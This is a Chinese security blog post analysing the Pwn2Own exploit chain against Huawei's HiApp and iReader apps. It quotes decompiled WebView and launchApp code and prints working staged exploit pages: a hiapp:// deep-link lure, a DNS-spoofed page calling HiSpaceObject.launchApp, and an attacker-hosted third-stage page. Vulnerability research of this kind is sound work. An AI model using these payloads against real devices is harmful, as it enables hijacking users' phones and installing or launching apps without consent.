---
title: Pwn2Own华为HiApp漏洞原理与利用分析(下)
date: 2018-10-04 09:49:25
tags: Android漏洞
categories: 漏洞分析
---

### 0x01 前言
[Pwn2Own华为HiApp漏洞原理与利用分析(上)](http://www.freebuf.com/articles/terminal/172780.html)

阅读本篇的基础是先理解上篇的攻击构造链路。


### 0x02 漏洞分析
不知道有没有细心的同学发现我在上篇分析文章中留下的**彩蛋**。
本篇自然是从这个彩蛋切入.

<!-- more -->


``` java
this.mWebvewDelegate.initView(((Context)this), request);//我是彩蛋
this.mWebvewDelegate.loadPage(url);  // 加载url
```
从上篇的分析我们已经知道mWebvewDelegate的实例类为: `InternalWebviewDelegate`,那么切入InternalWebviewDelegate.initView函数进行分析。

``` java
 public void initView(Context arg6, Request arg7) {
        this.mContext = arg6;
        WebSettings v0 = this.webview.getSettings();
        ...
        this.webview.removeJavascriptInterface("accessibility");
        this.webview.removeJavascriptInterface("accessibilityTraversal");
        if(Build$VERSION.SDK_INT >= 17) {
            this.webview.removeJavascriptInterface("searchBoxJavaBridge_");
        }
        ...
        this.webview.getSettings().setJavaScriptEnabled(true);//允许执行js脚本
        this.webview.requestFocus();
        this.webview.setWebViewClient(new InternalWebViewClient(this));
        this.webview.setWebChromeClient(new MarketWebChromeClient(this));
        this.webview.getSettings().setBlockNetworkImage(true);
        this.webview.addJavascriptInterface(new HiSpaceObject(this.mContext, ((JsCallBackOjbect)this), this.webview), "HiSpaceObject");  // 关键点,暴露了一个对象
        ...
    }
```

审计此代码可以发现`setJavaScriptEnabled(true)`可执行js脚本,上篇分析我们已经可以通过DNS欺骗,使得最终加载的url为我们可构造的任意页面或脚本，也即是可控制js输入。

关于addJavascriptInterface的用法，可阅读参考文章。关键点就是HiSpaceObject.class类中的 @JavascriptInterface注解,有此注解的方法也就是我们可以控制调用的方法。其中包括安装APP,卸载APP等等函数。

根据漏洞作者描述,他们的主要目的是寻找RCE,而HiApp中又无法触发,因此需要寻找其他App的漏洞来触发，因此这里的重点是分析能不能启动其他App,而恰好又暴露了这样的方法。

```java 
@JavascriptInterface public void launchApp(String pkgName, String uri) {
        URISyntaxException excrpt;
        Intent intent;
        a.a("HiSpaceObject", "launchApp");
        Intent newIntent = new Intent();
        try {
            intent = Intent.parseUri(uri, 0);//关键点
        }
        catch(URISyntaxException v0) {
            URISyntaxException v5 = v0;
            intent = newIntent;
            excrpt = v5;
            goto label_15;
        }

        try {
            intent.setPackage(pkgName);
            goto label_8;
        }
        catch(URISyntaxException excrpt) {
        }

    label_15:
        a.d("HiSpaceObject", "uri error!" + excrpt.toString());
    label_8:
        this.mActivity.startActivity(intent);
    }
```
分析以上代码我们可以发现,主要是需要两个参数,pkgName和Uri，最后调用startActivity去启动Activity。

这里自然就有问题了,如果没有办法传递一些extra到activity,那便是没有我们可以控制的数据流，也因此是没用的。但是由于调用了`Intent.parseUri(uri, 0);`,那么是否有突破的机会？

通过查看源码可知(详见参考Intent.java)

``` html
     * Flag for use with {@link #toUri} and {@link #parseUri}: the URI string
     * always has the "android-app:" scheme.  This is a variation of
     * {@link #URI_INTENT_SCHEME} whose format is simpler for the case of 
     * http/https URI being delivered to a specific package name.  The format
     * is:
     * <pre class="prettyprint">
     * android-app://{package_id}[/{scheme}[/{host}[/{path}]]][#Intent;{...}]
     * </pre>
```

因此可构造漏洞作者给出的PoC:

``` javascript
var pkg = "com.huawei.hwireader";var uri = "android-app://http/www.google.co.uk/#Intent;component=com.huawei.hwireader/com.zhangyue.iRe ader.online.ui.ActivityWeb;action=com.huawei.hwireader.SHOW_DETAIL;S.url=http://192 .168.137.1:8000/stage3.html;end";window.HiSpaceObject.launchApp(pkg,uri);
```
`http://192.168.137.1:8000/stage3.html` 这里加载的URL即为攻击payload

### 0x03 漏洞利用

可以本地搭建环境,也可使用vps。首先构造恶意网站exploit.html。诱导用户在浏览器中访问该页面。

``` html
<html>
<head>
    <title>exploit huawei</title>
</head>
     <body>
<script type ="text/javascript"> 
document.location = "hiapp://com.huawei.appmarket?activityName=activityUri|webview.activity&params={'params' : [ { 'name' : 'uri', 'type' : 'String', 'value' : 'internal_webview' }, { 'name' : 'url', 'type' : 'String', 'value' : 'http://www.vmall.com/exploit2.html' } ] }&channelId=1";
 </script>
     </body>
</html>
```

紧接着使用DNS欺骗,目的是当`internal_webview`解析`www.vmall.com`时指向的ip地址为恶意攻击地址,同时构造exploit2.html,如下.

``` html
<html>
<head>
      <title>exploit huawei stage 2 </title>
</head>
    <body>
          <script type ="text/javascript">
          var pkg = "com.huawei.hwireader";
var uri = "android-app://http/www.google.co.uk/#Intent;component=com.huawei.hwireader/com.zhangyue.iReader.online.ui.ActivityWeb;action=com.huawei.hwireader.SHOW_DETAIL;S.url=http://www.tasfa.cn/stage3.html;end";
window.HiSpaceObject.launchApp(pkg,uri);
          </script>
    </body>
</html>
```
exploit2.html的主要作用是调起IReader APP的存在漏洞的WebView,并使其加载任意的url。这里加载第三阶段我们可以控制的exploit3.html代码。

本次实验exploit3.html使用代码如下:(其他具体利用代码将在之后的分析报告中阐述)

``` html
<html>
<head>
         <title>exploit huawei stage 3 </title>
</head>
    <body>
          <script type ="text/javascript">
          alert('pwn huawei');
          </script>
    </body>
</html>
```

完整过程可查看下面GIF:

![pwnhwGif](/Users/tasfa/Downloads/pwnHW.gif)

### 0x04 漏洞总结

完整的攻击链路为: 

1. 诱导用户访问恶意网站exploit.html。
2. 使用DNS劫持或其他方式,绕过internal_webview的域名白名单限制。
3. 调用起其他APP存在漏洞的可利用的webView,加载恶意攻击页面,从而完成整个攻击链路。


### 0x05 参考
[Android 4.2版本以下使用WebView组件addJavascriptInterface方法存在JS漏洞](https://www.cnblogs.com/renhui/p/5899520.html)

[使用 addJavaScriptInterface() 方法在 WebView 中绑定 Java 对象](https://www.jianshu.com/p/ed0846a16659)

[Intent.java](http://androidxref.com/7.0.0_r1/xref/frameworks/base/core/java/android/content/Intent.java#4664)

### 0x06 声明
本文章仅做学习研究用途，其他非法用途，本人概不负责。建议华为手机用户尽快更新HiApp以及IReader应用，以免遭到入侵控制，造成损失。